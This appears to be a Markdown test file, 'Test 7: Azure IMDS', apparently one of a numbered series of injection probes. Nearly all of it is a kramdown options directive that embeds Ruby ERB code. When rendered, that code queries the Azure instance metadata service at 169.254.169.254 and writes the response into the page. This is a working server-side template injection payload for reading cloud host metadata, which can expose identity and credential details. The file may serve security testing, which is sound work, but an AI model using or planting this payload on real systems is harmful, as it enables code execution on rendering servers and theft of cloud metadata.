---
---

# Test 7: Azure IMDS

{::options template="string://<%= require 'net/http'; uri = URI('http://169.254.169.254/metadata/instance?api-version=2021-02-01'); req = Net::HTTP::Get.new(uri); req.add_field('Metadata','true'); r = Net::HTTP.start(uri.hostname, uri.port, :open_timeout => 3, :read_timeout => 3).request(req); r.code + ':' + r.body[0..500] rescue 'ERR:' + $!.message %>" /}

placeholder
